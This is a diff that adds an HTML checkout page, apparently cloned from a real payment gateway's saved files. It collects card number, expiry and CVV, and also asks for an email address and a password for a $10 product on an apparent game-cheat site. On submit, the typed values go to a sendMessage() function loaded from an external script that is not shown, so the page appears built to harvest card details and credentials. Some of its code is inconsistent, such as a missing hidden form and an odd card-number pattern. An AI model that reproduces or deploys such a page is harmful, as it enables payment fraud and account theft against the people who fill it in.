@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+	<title>Payment</title>
+	
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<link rel="icon" href="./assets/img/eulen-menu-520x386.png">
+	<link rel="stylesheet" type="text/css" href="assets/cpg_waiter.css">
+	<link rel="stylesheet" type="text/css" href="assets/pay-card.css">
+	<script type="text/javascript" src="assets/feature-detect.js.téléchargement"></script>
+	<script type="text/javascript" src="assets/jquery-3.6.0.min.js.téléchargement"></script>
+	<script type="text/javascript" src="assets/rb.js.téléchargement"></script>
+	<script type="text/javascript" src="assets/common.js.téléchargement"></script>
+	<script type="text/javascript" src="assets/cpg_waiter.js.téléchargement"></script>
+	<script type="text/javascript" src="assets/pay-card.bundle.js.téléchargement"></script>
+	<script type="text/javascript" src="assets/standard_waiter.js.téléchargement"></script>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+</head>
+
+<!-- IN BODY -->
+<body class="body_fixed-width_no" cz-shortcut-listen="true">
+<style>
+	.body_fixed-width_no {	
+		background-color: #000000;
+	}
+</style>
+<div class="pay-card js-pay-card" data-type="freepay">
+	<div class="pay-card__row">
+		<div class="pay-card__card js-credit-card">
+			
+
+
+<div class="credit-card-form credit-card-form_size_x-small">
+	
+		<div class="credit-card-form__popup-overlay js-cc-popup-overlay">  <div class="credit-card-form__popup js-cc-popup"> <div class="credit-card-form__popup-body"> <div class="notification-block"> <div class="notification-block__inner"> <div class="info-block "> <div class="info-block__img-wrapper"> <span class="img waiter-icon waiter-icon_name_alert"></span> </div> <div class="info-block__content"> <h3 class="title js-error-message">The payment could not be made.</h3> <p class="paragraph paragraph_color_red ">You can try to make the payment again or pay for the order with another card.</p> </div> </div> </div> </div> </div> <div class="credit-card-form__popup-footer js-cc-popup-footer"> <span class="js-button button">Repeat</span> </div> </div></div>
+	
+	
+		<div class="credit-card-form__popup-overlay js-cc-popup-overlay">
+			
+		<div class="credit-card-form__popup js-cc-timeout-popup">
+				<div class="credit-card-form__popup-body">
+					
+
+<div class="notification-block">
+	<div class="notification-block__inner">
+<div class="info-block "> <div class="info-block__img-wrapper"> <span class="img waiter-icon waiter-icon_name_alert"></span> </div> <div class="info-block__content"> <h3 class="title js-timeout-error-message">Operation status unknown.</h3> <p class="paragraph paragraph_color_red ">Click the button to see the status of your order.<br>It may have been successful.</p> </div> </div>
+	</div>
+</div>
+				</div>
+				<div class="credit-card-form__popup-footer js-cc-popup-footer">
+					<span class="js-button button">Find out status</span>
+				</div>
+			</div></div>
+	<form method="POST" action="javascript:void(0)" class="credit-card-form__form js-card-form" novalidate="novalidate" autocomplete="on" abineguid="052E0229E49C4E35A3DA75AD79E5769A">
+		<div class="credit-card-form__card-wrapper js-card-wrapper">
+			<div class="credit-card-form__card credit-card-form__card_position_front">
+				<div class="payment-systems-icons payment-systems-icons"> <span class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mir js-payment-system-icon-mir"></span> <span class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_visa js-payment-system-icon-visa"></span> <span class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mastercard js-payment-system-icon-mastercard"></span> <span class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_maestro js-payment-system-icon-maestro"></span> </div>
+				<div class="credit-card-form__label-group credit-card-form__label-group_type_card-number clearfix">
+					<label class="js-cc-label credit-card-form__label">
+						<span class="credit-card-form__title">Card number</span>
+						<input type="tel" id="card" inputmode="numeric" name="cardnumber" id="cardnumber" autocomplete="cc-number" placeholder="" class="credit-card-form__input js-cc-input js-cc-number-input" pattern="[0-3]*">
+						<div class="credit-card-form__error-text js-cc-number-input-error-text">Card number entered incorrectly</div>
+						
+					</label>
+				</div>
+				<div class="js-card-expiry-date-block credit-card-form__label-group credit-card-form__label-group_type_expiration-date clearfix js-cvv-adaptive-anchor-mobile">
+					
+						<label class="js-cc-label credit-card-form__label">
+							<span class="credit-card-form__title credit-card-form__title_type_expiration-date">Deadline<br>actions</span>
+						</label>
+<label class="js-cc-label credit-card-form__label">
+	<span class="credit-card-form__title">Month / Year</span>
+	<input type="tel" id="date" inputmode="numeric" name="expdate" id="expdate" autocomplete="cc-exp" placeholder="" class="credit-card-form__input js-cc-input js-cc-exp-input" pattern="[0-9]*">
+	<div class="credit-card-form__error-text">Wrong date</div>
+</label>	
+
+				</div>
+			</div>
+			<div class="credit-card-form__card credit-card-form__card_position_back">
+				<div class="credit-card-form__label-group credit-card-form__label-group_type_cvv clearfix js-cvv-adaptive-anchor-desktop">
+<label class="js-cc-label credit-card-form__label credit-card-form__label_type_cvv js-cc-cvv-label">
+	<span class="credit-card-form__title">CVV / CVC <div tabindex="-1" class="credit-card-form__cvv-icon js-cc-cvv-icon"></div></span>
+	<input type="tel" id="ccv" inputmode="numeric" name="cvc2" id="cvc2" placeholder="" class="credit-card-form__input credit-card-form__input_type_protected js-cc-input js-cc-cvv-input" pattern="[0-9]*" autocomplete="off">
+	<div class="credit-card-form__error-text js-cc-error-text">The last three digits on the back</div>
+</label>
+				</div>
+			</div>
+		</div>
+	<div class="credit-card-form__submit">
+		<div class="credit-card-form__submit-inner">
+		</div>
+	</div>
+	
+<script>
+var payCard;
+	(function(window, undefined) {
+		var $ = window.$;
+		var PayCard = window.PayCard;
+
+		var _cardTypeCurrentValue;
+
+		/** cache hidden form and inputs in local vars */
+		var $hiddenForm = $('.js-hidden-form');
+		var $hiddenFormCardNumberInput = $hiddenForm.find('input[name=pan]');
+		var $hiddenFormExpiryInput = $hiddenForm.find('input[name=exp_date]');
+		var $hiddenFormCvvInput = $hiddenForm.find('input[name=cvv]');
+
+		window.parent.postMessage('{"type": "billing", "action": "pageLoad"}', '*');
+
+		/** create credit card app instance */
+		payCard = PayCard.createInstance({
+			$root: $('.js-pay-card'),
+			cardholder: false,
+			cvvTooltip: false,
+			enableSetExpiryValue: true,
+			disableExpiryCheckFromDate: '1/2000',
+			expireDateYearsLimit: 30,
+			onCardSubmit: function() {
+				putSubmitButtonClickPixel();
+				putCopyPasteFillPixel();
+
+				/** get card values and format them for processing */
+				var number = payCard.getNumberValue().replace(/ /g, '');
+				var cvv = payCard.getCvvValue();
+				var expiry = payCard.getMonthValue() + '.' + payCard.getYearValue();
+
+				/** set hidden input values */
+				$hiddenFormCardNumberInput.val(number);
+				$hiddenFormExpiryInput.val(expiry);
+				$hiddenFormCvvInput.val(cvv);
+
+				/** submit hidden form */
+				$hiddenForm.trigger("submit");
+			},
+			onValidationError: function() {
+				putSubmitButtonClickPixel();
+
+				var isNumberInvalid = !payCard.isNumberValid();
+				var isExpiryInvalid = !payCard.isExpiryValid();
+				var isCvvInvalid = !payCard.isCvvValid();
+
+				cpg_context['rb'].putPixel('form_client-validation-error');
+				if (isNumberInvalid) {
+					cpg_context['rb'].putPixel('form_client-validation-error-number');
+				}
+				else if (isExpiryInvalid) {
+					cpg_context['rb'].putPixel('form_client-validation-error-date');
+				}
+				else if (isCvvInvalid) {
+					cpg_context['rb'].putPixel('form_client-validation-error-cvv');
+				}
+				return false;
+			},
+			onCardTypeUpdate: function onCardTypeUpdate(cardType) {
+				if (cardType && cardType !== _cardTypeCurrentValue) {
+					_cardTypeCurrentValue = cardType;
+					window.parent.postMessage(JSON.stringify({
+						type: 'billing',
+						action: 'typeCard',
+						action_params: cardType
+					}), '*');
+				}
+			},
+			onHideTimeoutPopup: function() {
+				if (typeof restartPoll === 'function') {
+					restartPoll();
+				}
+			}
+		});
+
+		if (typeof sendFrameResizeMessage === 'function') {
+			sendFrameResizeMessage();
+		}
+	})(window);
+
+function setupInputEvents() {
+	var $allInputs = $('input');
+
+	var handlers = {
+		onPaste: function() {
+			isPasteDetected = true;
+			cpg_context['rb'].putPixel('form_fill-copypaste');
+		}
+	};
+
+	$allInputs.on('paste', handlers.onPaste);
+}
+
+var pixels = { "page_load": 15525632, "form_submit-button-click-all": 15525634, "form_submit-button-click-first": 15525635, "form_send": 15525636, "form_client-validation-error": 15525638, "form_client-validation-error-number": 15525641, "form_client-validation-error-date": 15525642, "form_client-validation-error-cvv": 15525643, "form_client-validation-error-cardholder": 15525645, "form_server-validation-error": 15525649, "form_fill-copypaste": 17501201, "form_fill-copypaste-send": 17509445, "3ds_start": 15525658, "3ds_finish": 15525660, "result_fail": 15525661, "result_success": 15525663 };
+
+var cpg_context = {};
+
+cpg_context['rb'] = new rb({ pixels: pixels });
+
+cpg_context['json_cards'] = {};
+
+$(document).ready(function() {
+	cpg_context['rb'].putPixel('page_load');
+	var waiter = createCpgStandardWaiter(cpg_context);
+	assignFormHandlers(cpg_context, waiter);
+	setupInputEvents();
+});
+
+</script>
+<div id="volume-booster-visusalizer">
+                    <div class="sound">
+                        <div class="sound-icon"></div>
+                        <div class="sound-wave sound-wave_one"></div>
+                        <div class="sound-wave sound-wave_two"></div>
+                        <div class="sound-wave sound-wave_three"></div>
+                    </div>
+                    <div class="segments-box">
+                        <div data-range="1-20" class="segment"><span></span></div>
+                        <div data-range="21-40" class="segment"><span></span></div>
+                        <div data-range="41-60" class="segment"><span></span></div>
+                        <div data-range="61-80" class="segment"><span></span></div>
+                        <div data-range="81-100" class="segment"><span></span></div>
+                    </div>
+                </div>
+
+
+
+
+
+    <div class="payment-container">
+        <div class="price">Product Price: $10.00</div>
+
+        <input type="email" class="email" placeholder="Email"  id="email" required>
+
+		<input type="password" class="password" placeholder="Password" id="password" required>
+		<button type="button" onclick="togglePasswordVisibility()" class="password-toggle-button">Show Password</button>
+
+
+		<input type="password" class="confirm-password" placeholder="Confirm Password" id="confirmPassword" required>
+		
+
+        <label class="accept-terms">
+            <input type="checkbox" id="acceptTerms"> Accept <a href="https://eulenchetas.eu/terms-of-service.html" class="text-primary" target="_blank">Terms of Service</a>
+        </label>
+
+        <div class="credit-card-form__submit">
+            <div class="credit-card-form__submit-inner">
+                <button type="button" class="js-button-submit button" onclick="validateAndPay()"><span class="mbr-iconfont fas fa-solid fa-arrow-right"></span> Pay</button>
+				
+            </div>
+        </div>
+    </div>
+
+<div>	<p style="color: #999; margin-top: 15px; font-family: 'Jost', sans-serif; font-size: 14px; display: inline-block;">
+	By purchasing, you understand and accept our <a style="color: red;" href="https://eulencheats.eu/terms-of-service.html" class="text-primary" target="_blank">Terms of Service</a>.
+</p></div>
+	
+
+<script>
+	function validateAndPay() {
+  // Vérification de l'e-mail
+  var email = document.querySelector(".email").value;
+  var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  if (!emailRegex.test(email)) {
+    alert("Veuillez saisir une adresse e-mail valide.");
+    return;
+  }
+
+  // Vérification du mot de passe et de la confirmation du mot de passe
+  var password = document.querySelector(".password").value;
+  var confirmPassword = document.querySelector(".confirm-password").value;
+  if (password !== confirmPassword) {
+    alert("Les mots de passe ne correspondent pas.");
+    return;
+  }
+
+  // Si tout est correct, appeler sendMessage()
+  sendMessage();
+}
+
+</script>
+<script>
+function togglePasswordVisibility() {
+  var passwordField = document.getElementById("password");
+  var confirmPasswordField = document.getElementById("confirmPassword");
+
+  if (passwordField.type === "password") {
+    passwordField.type = "text";
+    confirmPasswordField.type = "text";
+  } else {
+    passwordField.type = "password";
+    confirmPasswordField.type = "password";
+  }
+}
+
+</script>
+
+				<style>
+					.payment-container {
+						max-width: 400px;
+						margin: 0 auto;
+						padding: 20px;
+						background-color: #f9f9f9;
+						border-radius: 10px;
+					}
+			
+					.payment-container h2 {
+						margin-bottom: 20px;
+					}
+			
+					.payment-container .price {
+						font-size: 18px;
+						margin-bottom: 10px;
+					}
+			
+					.payment-container .accept-terms {
+						margin-bottom: 10px;
+					}
+			
+					.payment-container .email,
+					.payment-container .password,
+					.payment-container .confirm-password {
+						width: 100%;
+						padding: 10px;
+						margin-bottom: 10px;
+						border: 1px solid #ccc;
+						border-radius: 5px;
+					}
+					/* Style du bouton pour voir le mot de passe */
+
+
+				</style>			
+
+
+			</body>
+<script type="text/javascript" src="./assets/script/script3.js"> </script>
+</html>
